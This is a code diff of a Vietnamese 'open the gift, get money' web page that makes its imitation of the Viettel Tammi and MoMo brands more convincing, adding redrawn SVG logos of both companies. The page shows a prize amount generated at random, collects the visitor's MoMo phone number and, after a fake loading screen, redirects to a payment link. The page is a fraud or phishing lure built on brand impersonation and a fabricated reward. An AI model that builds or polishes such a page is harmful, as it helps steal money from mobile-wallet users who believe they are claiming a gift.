@@ -6,7 +6,6 @@
     <title>Viettel Tammi × MoMo – Mở Quà Nhận Tiền</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-
         html, body { height: 100%; }
 
         body {
@@ -70,7 +69,7 @@
             background: rgba(255,255,255,0.15);
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255,255,255,0.25);
-            padding: 8px 18px;
+            padding: 7px 16px;
             border-radius: 50px;
             color: #fff;
             font-size: 13px;
@@ -102,44 +101,65 @@
             margin: 0 auto;
         }
 
-        /* Brand */
+        /* ===== BRAND với LOGO THẬT ===== */
         .brand-row {
             display: flex;
             align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
+            gap: 14px;
+            margin-bottom: 22px;
             color: #fff;
         }
 
-        .brand-logo {
-            width: 44px; height: 44px;
-            background: #fff;
-            border-radius: 12px;
+        .brand-logos {
             display: flex;
             align-items: center;
-            justify-content: center;
-            box-shadow: 0 6px 18px rgba(0,0,0,0.25);
+            gap: 6px;
+        }
+
+        /* Logo Viettel */
+        .logo-viettel {
+            width: 48px; height: 48px;
+            border-radius: 12px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.3);
+            display: block;
+        }
+
+        /* Dấu x */
+        .logo-x {
+            color: rgba(255,255,255,0.7);
+            font-size: 16px;
             font-weight: 900;
-            font-size: 20px;
-            color: #EE0033;
-            font-family: 'Arial Black', sans-serif;
+        }
+
+        /* Logo MoMo */
+        .logo-momo {
+            width: 48px; height: 48px;
+            border-radius: 12px;
+            box-shadow: 0 6px 18px rgba(0,0,0,0.3);
+            display: block;
+        }
+
+        .brand-text-wrap {
+            display: flex;
+            flex-direction: column;
         }
 
         .brand-name {
-            font-size: 19px;
+            font-size: 17px;
             font-weight: 800;
-            letter-spacing: 0.3px;
+            letter-spacing: 0.2px;
+            line-height: 1.15;
         }
         .brand-name span { color: #ffd166; }
         .brand-sub {
-            font-size: 11px;
+            font-size: 10.5px;
             color: rgba(255,255,255,0.75);
-            margin-top: 2px;
-            letter-spacing: 0.5px;
+            margin-top: 3px;
+            letter-spacing: 0.6px;
             font-weight: 500;
         }
 
-        /* Tiêu đề */
+        /* ===== HERO ===== */
         .hero {
             text-align: center;
             color: #fff;
@@ -147,7 +167,7 @@
         }
 
         .hero .line1 {
-            font-size: 13px;
+            font-size: 12.5px;
             font-weight: 600;
             color: #ffd166;
             letter-spacing: 2px;
@@ -156,7 +176,7 @@
         }
 
         .hero .line2 {
-            font-size: 25px;
+            font-size: 24px;
             font-weight: 900;
             line-height: 1.2;
             text-shadow: 0 4px 20px rgba(0,0,0,0.3);
@@ -340,7 +360,7 @@
             filter: blur(6px);
         }
 
-        /* Nút mở quà */
+        /* ===== NÚT MỞ QUÀ ===== */
         .open-btn {
             display: inline-flex;
             align-items: center;
@@ -378,9 +398,7 @@
             box-shadow: 0 7px 0 #b88a00;
         }
 
-        .open-btn .emoji { font-size: 20px; }
-
-        /* ===== REWARD (số tiền) ===== */
+        /* ===== REWARD ===== */
         .reward {
             display: none;
             width: 100%;
@@ -391,14 +409,8 @@
             margin-top: 8px;
         }
 
-        .reward.show {
-            display: block;
-        }
-
-        .reward.visible {
-            opacity: 1;
-            transform: translateY(0) scale(1);
-        }
+        .reward.show { display: block; }
+        .reward.visible { opacity: 1; transform: translateY(0) scale(1); }
 
         .reward-label {
             color: rgba(255,255,255,0.9);
@@ -414,9 +426,7 @@
             font-weight: 900;
             color: #ffd166;
             line-height: 1.1;
-            text-shadow:
-                0 0 30px rgba(255,209,102,0.7),
-                0 4px 0 rgba(0,0,0,0.2);
+            text-shadow: 0 0 30px rgba(255,209,102,0.7), 0 4px 0 rgba(0,0,0,0.2);
             margin-bottom: 4px;
             letter-spacing: -1px;
         }
@@ -442,20 +452,40 @@
             width: 100%;
             background: #fff;
             border-radius: 20px;
-            padding: 24px 22px;
+            padding: 22px 22px 24px;
             box-shadow: 0 20px 50px rgba(0,0,0,0.35);
             opacity: 0;
             transform: translateY(30px);
             transition: all 0.5s cubic-bezier(0.16, 1, 0.3, 1);
         }
 
-        .link-form.show {
-            opacity: 1;
-            transform: translateY(0);
+        .link-form.show { opacity: 1; transform: translateY(0); }
+
+        /* Header form có 2 logo */
+        .form-logos {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 12px;
+        }
+
+        .form-logos .logo-viettel,
+        .form-logos .logo-momo {
+            width: 36px;
+            height: 36px;
+            border-radius: 9px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .form-logos .logo-x {
+            color: #999;
+            font-size: 14px;
+            font-weight: 900;
         }
 
         .link-form h3 {
-            font-size: 17px;
+            font-size: 16px;
             font-weight: 800;
             color: #1a1a1a;
             text-align: center;
@@ -467,7 +497,7 @@
             color: #666;
             text-align: center;
             margin-bottom: 18px;
-            line-height: 1.5;
+            line-height: 1.55;
         }
 
         .link-form .sub strong { color: #EE0033; }
@@ -518,7 +548,7 @@
 
         .btn-claim {
             width: 100%;
-            padding: 16px;
+            padding: 15px;
             background: linear-gradient(135deg, #EE0033 0%, #c40029 100%);
             color: #fff;
             border: none;
@@ -530,7 +560,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 8px;
+            gap: 10px;
             box-shadow: 0 8px 20px rgba(238,0,51,0.35);
             transition: all 0.25s;
             letter-spacing: 0.3px;
@@ -550,16 +580,13 @@
             box-shadow: none;
         }
 
-        .momo-badge {
-            width: 22px; height: 22px;
-            background: #fff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-weight: 900;
-            color: #a0153e;
-            font-size: 13px;
+        /* MoMo icon trong button */
+        .btn-momo-icon {
+            width: 22px;
+            height: 22px;
+            border-radius: 6px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.15);
+            flex-shrink: 0;
         }
 
         /* ===== LOADING ===== */
@@ -591,7 +618,7 @@
 
         .loading p { font-weight: 600; letter-spacing: 0.3px; }
 
-        /* ===== FOOTER ===== */
+        /* Footer */
         .footer-note {
             position: relative;
             z-index: 5;
@@ -606,7 +633,8 @@
 
         @media (max-width: 420px) {
             .hero .line2 { font-size: 22px; }
-            .brand-name { font-size: 17px; }
+            .brand-name { font-size: 15px; }
+            .logo-viettel, .logo-momo { width: 42px; height: 42px; }
             .reward-amount { font-size: 40px; }
             .gift-stage { height: 240px; }
             .gift-box { transform: scale(0.9); }
@@ -629,12 +657,36 @@
     <!-- MAIN -->
     <div class="wrap">
 
-        <!-- BRAND -->
+        <!-- BRAND với logo Viettel + MoMo -->
         <div class="brand-row">
-            <div class="brand-logo">V</div>
-            <div>
+            <div class="brand-logos">
+                <!-- Viettel Tammi logo -->
+                <svg class="logo-viettel" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="Viettel Tammi">
+                    <rect width="100" height="100" rx="22" fill="#EE0033"/>
+                    <path d="M 28 30 L 50 62 L 72 30" stroke="#fff" stroke-width="11" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    <circle cx="50" cy="72" r="6" fill="#fff"/>
+                </svg>
+
+                <span class="logo-x">×</span>
+
+                <!-- MoMo logo -->
+                <svg class="logo-momo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-label="MoMo">
+                    <defs>
+                        <linearGradient id="momoGrad" x1="0" y1="0" x2="1" y2="1">
+                            <stop offset="0%" stop-color="#F5327D"/>
+                            <stop offset="100%" stop-color="#A50064"/>
+                        </linearGradient>
+                    </defs>
+                    <rect width="100" height="100" rx="22" fill="url(#momoGrad)"/>
+                    <!-- Chữ M kiểu MoMo (2 vòm tròn) -->
+                    <path d="M 22 72 L 22 42 Q 22 28 34 28 Q 46 28 46 42 Q 46 28 58 28 Q 70 28 70 42 L 70 72"
+                          stroke="#fff" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                </svg>
+            </div>
+
+            <div class="brand-text-wrap">
                 <div class="brand-name">Viettel <span>Tammi</span></div>
-                <div class="brand-sub">TẶNG QUÀ – KẾT NỐI VÍ MOMO</div>
+                <div class="brand-sub">× MOMO – TẶNG QUÀ</div>
             </div>
         </div>
 
@@ -678,6 +730,27 @@
             <div class="reward-note">Liên kết Ví MoMo để nhận tiền vào ví</div>
 
             <div class="link-form" id="linkForm">
+                <!-- 2 logo ở đầu form -->
+                <div class="form-logos">
+                    <svg class="logo-viettel" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <rect width="100" height="100" rx="22" fill="#EE0033"/>
+                        <path d="M 28 30 L 50 62 L 72 30" stroke="#fff" stroke-width="11" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                        <circle cx="50" cy="72" r="6" fill="#fff"/>
+                    </svg>
+                    <span class="logo-x">×</span>
+                    <svg class="logo-momo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <defs>
+                            <linearGradient id="momoGrad2" x1="0" y1="0" x2="1" y2="1">
+                                <stop offset="0%" stop-color="#F5327D"/>
+                                <stop offset="100%" stop-color="#A50064"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="100" height="100" rx="22" fill="url(#momoGrad2)"/>
+                        <path d="M 22 72 L 22 42 Q 22 28 34 28 Q 46 28 46 42 Q 46 28 58 28 Q 70 28 70 42 L 70 72"
+                              stroke="#fff" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    </svg>
+                </div>
+
                 <h3>🔗 Liên kết Ví MoMo</h3>
                 <div class="sub">
                     Nhập số điện thoại MoMo để liên kết và nhận<br>
@@ -696,7 +769,18 @@
                 <div class="err" id="phoneErr">Vui lòng nhập số điện thoại 10 số hợp lệ</div>
 
                 <button class="btn-claim" id="claimBtn" onclick="claimGift()">
-                    <div class="momo-badge">M</div>
+                    <!-- MoMo icon thật trong nút -->
+                    <svg class="btn-momo-icon" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <defs>
+                            <linearGradient id="momoGrad3" x1="0" y1="0" x2="1" y2="1">
+                                <stop offset="0%" stop-color="#F5327D"/>
+                                <stop offset="100%" stop-color="#A50064"/>
+                            </linearGradient>
+                        </defs>
+                        <rect width="100" height="100" rx="22" fill="url(#momoGrad3)"/>
+                        <path d="M 22 72 L 22 42 Q 22 28 34 28 Q 46 28 46 42 Q 46 28 58 28 Q 70 28 70 42 L 70 72"
+                              stroke="#fff" stroke-width="9" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+                    </svg>
                     Liên kết ví để nhận quà
                 </button>
             </div>
@@ -739,10 +823,9 @@
 
         spawnConfetti(45, false);
 
-        // ============ RANDOM SỐ TIỀN 200 – 1.000.000 ============
+        // ============ RANDOM TIỀN 200 – 1.000.000 ============
         function randomAmount() {
             const raw = Math.floor(Math.random() * (1000000 - 200 + 1)) + 200;
-            // Nếu >= 1000 thì làm tròn nghìn cho đẹp, ngược lại làm tròn trăm
             if (raw >= 1000) return Math.floor(raw / 1000) * 1000;
             return Math.floor(raw / 100) * 100;
         }
@@ -771,40 +854,31 @@
             if (opened) return;
             opened = true;
 
-            const giftBox = document.getElementById('giftBox');
+            document.getElementById('giftBox').classList.add('opened');
             const openBtn = document.getElementById('openBtn');
-
-            giftBox.classList.add('opened');
             openBtn.disabled = true;
             openBtn.innerHTML = '<span class="emoji">🎉</span> Đã mở quà';
 
-            // Confetti mừng
             spawnConfetti(30, true);
 
-            // Ẩn hộp quà sau khi mở xong
             setTimeout(() => {
                 document.getElementById('giftStage').classList.add('hidden');
             }, 700);
 
-            // Hiện reward + form
             setTimeout(() => {
                 const reward = document.getElementById('reward');
                 reward.classList.add('show');
 
-                // Ép reflow để chạy animation
                 requestAnimationFrame(() => {
                     reward.classList.add('visible');
 
-                    // Số tiền pop + count-up
                     const amount = randomAmount();
                     const el = document.getElementById('rewardAmount');
                     el.classList.add('pop');
                     countUp(el, amount);
 
-                    // Cập nhật số tiền vào form
                     document.getElementById('formAmount').textContent = formatMoney(amount);
 
-                    // Form trượt lên sau 300ms
                     setTimeout(() => {
                         document.getElementById('linkForm').classList.add('show');
                         document.getElementById('phone').focus({ preventScroll: true });
@@ -827,7 +901,6 @@
         function claimGift() {
             const phone = phoneInput.value.trim();
 
-            // Validate SĐT
             if (!/^0\d{9}$/.test(phone)) {
                 phoneInput.classList.add('error');
                 document.getElementById('phoneErr').classList.add('show');
@@ -835,20 +908,16 @@
                 return;
             }
 
-            // Kiểm tra payment URL
             if (!paymentUrl) {
                 alert('Không tìm thấy link thanh toán. Vui lòng thử lại!');
                 return;
             }
 
-            // Hiện loading
             const loading = document.getElementById('loading');
             loading.classList.add('show');
 
-            const btn = document.getElementById('claimBtn');
-            btn.disabled = true;
+            document.getElementById('claimBtn').disabled = true;
 
-            // Redirect sau 1.5s
             setTimeout(() => {
                 window.location.href = paymentUrl;
             }, 1500);
